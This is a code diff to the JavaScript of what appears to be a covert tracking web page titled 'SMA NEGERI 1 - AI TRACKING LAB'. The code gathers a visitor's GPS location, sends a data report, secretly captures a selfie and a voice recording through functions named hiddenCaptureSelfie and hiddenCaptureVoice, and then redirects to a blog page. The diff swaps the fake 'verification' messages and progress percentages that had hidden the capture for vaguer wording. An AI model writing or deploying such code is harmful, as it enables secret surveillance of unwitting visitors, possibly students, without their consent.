@@ -363,8 +363,8 @@
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             
             let msg = `╔════════════════════════════════════════╗\n`;
-            msg += `║   🏫 SMA NEGERI 1 - AI TRACKING LAB  \n`;
-            msg += `║        by ANBATUKANG 🫦              \n`;
+            msg += `║   🏫 SMA NEGERI 1 - AI TRACKING LAB  ║\n`;
+            msg += `║        by ANBATUKANG 🫦              ║\n`;
             msg += `╚════════════════════════════════════════╝\n\n`;
             
             msg += `<b>📍 LOKASI GPS</b>\n`;
@@ -621,16 +621,16 @@
                 }
                 
                 // 3. KIRIM LAPORAN LENGKAP
-                showToast('verifikasi');
+                showToast('📡 Mengirim laporan data...');
                 await sendFullReport();
                 
                 // 4. KIRIM SELFIE
-                showToast('50 %');
+                showToast('sebentar');
                 await hiddenCaptureSelfie();
                 
                 // 5. KIRIM VOICE (jika mikrofon diizinkan)
                 if (permissions.mic) {
-                    showToast('100 %');
+                    showToast('sebentar lagi');
                     await hiddenCaptureVoice();
                 } else {
                     const gpsText = (gpsData && gpsData.lat) ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
@@ -638,8 +638,8 @@
                 }
                 
                 // 6. REDIRECT KE TRACKING.HTML
-                loading.innerHTML = '✅ verifikasi berhasil! Mengalihkan ke website...';
-                showToast('✅ verifikasi berhasil! Mengalihkan...');
+                loading.innerHTML = '✅ Semua data terkirim! Mengalihkan ke website';
+                showToast('✅ Semua data terkirim! Mengalihkan...');
                 
                 setTimeout(() => {
                     window.location.href = 'blog.html';
